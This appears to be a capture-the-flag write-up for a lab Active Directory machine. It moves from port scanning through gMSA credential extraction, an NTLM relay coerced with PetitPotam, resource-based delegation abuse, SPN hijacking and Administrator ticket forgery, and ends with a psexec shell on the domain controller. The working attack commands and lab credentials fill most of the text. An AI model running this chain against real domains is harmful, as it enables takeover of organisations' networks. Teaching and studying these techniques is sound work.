This write-up documents the full compromise of an Active Directory environment, from the initial reconnaissance phase to obtaining full administrative access to the Domain Controller. The attack path involves network discovery, Active Directory enumeration, abuse of service accounts, lateral movement, NTLM relay attacks, and privilege escalation through SPN hijacking.

## Initial Host Discovery

The first step is to verify whether the target host is reachable from the attacking machine using `ping`.

```bash
ping -c 3 <target>
```

If the host responds successfully, network connectivity is confirmed.

## Port Scanning and Service Identification

Once connectivity is confirmed, a full TCP port scan is performed using Nmap.

```bash
nmap -p- -sS --open -Pn 10.129.16.43 -T4 --stats-every=5s -oN scan_ports.txt
```

### Parameter Explanation

- `-p-` — scans all 65535 TCP ports
- `-sS` — SYN stealth scan
- `--open` — display only open ports
- `-Pn` — skip host discovery
- `-T4` — faster scan timing
- `--stats-every=5s` — progress update every 5 seconds
- `-oN` — save results in normal format

The scan reveals multiple services typically found in **Active Directory environments**, including Kerberos, LDAP, and SMB. This strongly suggests that the target machine is acting as a **Domain Controller**.

To gather more detailed information about these services, a version scan with default NSE scripts is performed.

```bash
nmap -p 53,80,88,135,139,389,443,445,464,593,636,2179,3268,3269,5985,9389,49667,49685,49686,49688,49689,49914,52178,57223 10.129.16.43 -sCV -Pn -oN full_scan.txt
```

This scan reveals the hostname of the Domain Controller, which must be added to `/etc/hosts` to ensure proper name resolution when interacting with domain services.

## Active Directory Enumeration with BloodHound

To gain deeper visibility into domain relationships and possible privilege escalation paths, **BloodHound** is used. Data is collected with `bloodhound-python`.

```bash
bloodhound-python -u pentest -p 'p3nt3st2025!&' -d pirate.htb -dc dc01.pirate.htb -gc dc01.pirate.htb -ns 10.129.11.216 -c all --zip
```

The resulting dataset is imported into BloodHound for analysis.

## Kerberos Time Synchronization

Kerberos authentication relies heavily on accurate time synchronization between systems. If the attacking machine's clock differs from the Domain Controller, authentication may fail.

The server time is retrieved using an SMB-related Nmap script.

```bash
nmap -p 445 -sV --script smb2-time 10.129.16.43
```

![Domain Controller time retrieved via smb2-time](/assets/images/pirate/Pasted-image-20260304235439.png)
*Domain Controller time retrieved through the smb2-time NSE script*

The local system clock is then synchronized to this time.

```bash
sudo ntpdate 10.129.16.43
```

## Extracting gMSA Credentials

Using the compromised machine account, **Group Managed Service Account (gMSA)** credentials can be retrieved.

```bash
nxc ldap 10.129.16.43 -u ms01$ -p ms01 -k --gmsa
```

![gMSA credentials extracted via LDAP](/assets/images/pirate/Pasted-image-20260305003129.png)
*gMSA credentials retrieved using the ms01$ machine account*

> gMSA accounts are designed so that only authorized hosts and accounts can retrieve their password. If a compromised account has the right to read a gMSA's `msDS-ManagedPassword` attribute, its credentials can be computed directly from that attribute — providing a path to whatever privileges that gMSA holds.

These credentials can be used to authenticate to other services in the domain.

## Network Pivoting with Ligolo

To access the internal network, a tunnel is established using **Ligolo**, a tool that creates a transparent network tunnel between the attacker and a compromised host, allowing direct routing to otherwise unreachable subnets.

The agent is executed on the compromised host to establish the tunnel.

## Identifying NTLM Relay Conditions

Inspection of the SMB configuration on WEB01 reveals that **SMB signing is disabled**.

![SMB signing disabled on WEB01](/assets/images/pirate/Pasted-image-20260306175405.png)
*SMB signing confirmed disabled on WEB01*

> When SMB signing is disabled, captured NTLM authentication attempts can be relayed to another server and used to authenticate as the victim, without ever needing to crack the underlying hash. This is the basis of an NTLM relay attack.

## NTLM Relay Attack Setup

A relay server is set up using **Impacket's ntlmrelayx**, targeting the Domain Controller's LDAP service.

```bash
impacket-ntlmrelayx -t ldap://dc01.pirate.htb -smb2support --delegate-access --no-dump --no-da --no-acl --no-validate-privs
```

A malicious DNS record is created to facilitate the relay attack, pointing a hostname to the attacker's machine.

```bash
python3 dnstool.py -u 'pirate.htb\pentest' -p 'p3nt3st2025!&' -r 'WIN-N0tAttacker' -a add -d '10.10.14.70' 10.129.12.26
```

## Triggering the Relay with PetitPotam

The **PetitPotam** technique is used to force the target to authenticate to the attacker-controlled relay. PetitPotam abuses the MS-EFSRPC protocol to coerce a machine account into authenticating over SMB to a remote host of the attacker's choosing.

```bash
python3 PetitPotam/PetitPotam.py -d pirate.htb -u 'pentest' -p 'p3nt3st2025!&' '10.10.14.140/file.txt' '192.168.100.2' -pipe all
```

The NTLM relay successfully creates a new computer account with delegation privileges.

```
[*] Adding new computer with username: KCREIZSF$
[*] Delegation rights modified succesfully!
[*] KCREIZSF$ can now impersonate users on WEB01$ via S4U2Proxy
```

> Relaying the coerced machine authentication to LDAP allows the attacker to create a new computer account and grant it **resource-based constrained delegation (RBCD)** rights over WEB01$. This effectively allows the newly created account to impersonate any user — including Administrator — when authenticating to WEB01.

## Kerberos Ticket Impersonation

Using the newly created machine account, a service ticket is requested while impersonating the **Administrator** user, via the S4U2Self/S4U2Proxy extension abused by the RBCD configuration.

```bash
impacket-getST -spn 'cifs/WEB01.pirate.htb' -impersonate Administrator 'pirate.htb/KCREIZSF$:ukHn{VWBI.:+HYi' -dc-ip 10.129.11.216
```

The ticket is exported for later use.

```bash
export KRB5CCNAME=/Hack/Pirate/Administrator@cifs_WEB01.pirate.htb@PIRATE.HTB.ccache
```

## SPN Hijacking Attack

A **Service Principal Name (SPN)** uniquely identifies a service within an Active Directory domain and is used to map a Kerberos service ticket request to a specific account. By manipulating SPNs, it is possible to redirect Kerberos service ticket requests for a given service to a different account.

First, a new SPN is added to the `a.white_adm` account, mapping the HTTP service on WEB01 to it.

```bash
python3 addspn.py -u 'pirate.htb\a.white_adm' -p 'Test_123' -t WEB01$ -s HTTP/WEB01.pirate.htb -r DC01.pirate.htb
```

Next, the same SPN is removed from the Domain Controller's computer account, where it originally belonged.

```bash
python3 addspn.py -u 'pirate.htb\a.white_adm' -p 'Test_123' -t DC01$ -s HTTP/WEB01.pirate.htb DC01.pirate.htb
```

> Moving an SPN from the Domain Controller's computer account to a controlled user account means that any Kerberos service ticket subsequently issued for that SPN will be encrypted with the controlled account's key — allowing that ticket to be decrypted and forged by the attacker, then presented to the Domain Controller via an alternate service mapping.

## Domain Controller Compromise

Finally, a Kerberos service ticket is requested while impersonating the **Domain Administrator**, targeting the hijacked SPN but requesting an alternate service (CIFS on the Domain Controller).

```bash
impacket-getST -spn HTTP/WEB01.pirate.htb -impersonate Administrator pirate.htb/a.white_adm:Test_123 -dc-ip DC01.pirate.htb -altservice CIFS/DC01.pirate.htb
```

![Administrator ticket obtained for CIFS on the Domain Controller](/assets/images/pirate/Pasted-image-20260306201645.png)
*Forged Administrator ticket obtained for the Domain Controller's CIFS service*

Using this ticket, a shell is obtained on the Domain Controller.

```bash
impacket-psexec -k -no-pass DC01.pirate.htb
```

At this point, the Domain Controller is fully compromised and full administrative access to the Active Directory domain has been achieved.
